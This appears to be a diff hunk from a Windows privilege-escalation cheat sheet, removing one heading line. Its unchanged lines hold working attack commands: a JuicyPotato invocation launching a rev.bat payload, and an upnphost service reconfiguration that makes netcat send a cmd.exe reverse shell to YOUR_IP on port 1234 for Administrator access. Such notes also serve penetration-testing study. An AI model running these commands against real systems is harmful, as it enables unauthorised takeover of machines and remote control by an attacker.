@@ -66,7 +66,6 @@ juicypotato.exe -l 1340 -t * -p c:\Users\Public\Documents\rev.bat
 
 ### Windows XP SP1 is known to be vulnerable to PE in upnphost. 
 
-You get Administrator with:
 ```
 VICTIM MACHINE
 sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
